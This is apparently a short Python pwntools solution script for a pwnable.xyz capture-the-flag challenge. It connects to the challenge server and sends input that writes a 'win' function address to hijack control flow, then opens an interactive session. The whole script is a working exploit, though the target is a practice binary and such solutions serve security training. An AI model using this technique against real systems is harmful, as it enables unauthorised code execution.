#!/usr/bin/env python
from pwn import *
context(os='linux', arch='amd64')

local = False

if local:
    p = process('./challenge')
    print util.proc.pidof(p)
    pause()
else:
    p = remote('svc.pwnable.xyz', 30002)

win_addr = 0x400822


if __name__ == '__main__':
    payload = str(win_addr) + ' ' + str(0) + ' ' + str(13)
    p.sendlineafter('Input: ', payload)
    p.sendlineafter('Input: ', 'a a a')
p.interactive()
